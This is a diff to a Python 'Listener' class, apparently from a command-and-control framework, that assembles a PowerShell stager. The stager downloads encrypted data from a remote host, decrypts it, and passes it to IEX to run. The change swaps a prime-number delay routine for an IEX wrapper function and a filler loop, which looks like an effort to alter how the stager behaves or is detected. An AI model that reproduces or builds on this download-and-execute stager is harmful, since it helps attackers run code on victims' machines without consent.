@@ -362,7 +362,8 @@ class Listener:
             stager += "$mdata=$talk.DownloadData($hom+$t);"
             stager += "$iv=$mdata[0..3];$mdata=$mdata[4..$mdata.length];"
             
-            stager += "function Perform-PrimeCheck { $maxNumber = 300000; $primes = @(); for ($i = 2; $i -le $maxNumber; $i++) { $isPrime = $true; for ($j = 2; $j -le [math]::Sqrt($i); $j++) { if ($i % $j -eq 0) { $isPrime = $false; break } }; if ($isPrime) { $primes += $i } } };"
+            stager += "function goForIT ($rdata) {IEX -Command $($rdata)};"
+            stager += "0..300 | ForEach-Object { $t12=$_+$T12 };"
 
             # decode everything and kick it over to IEX to kick off execution
             stager += "$t5 = -join[Char[]](& $M $mdata ($IV+$Kk));"
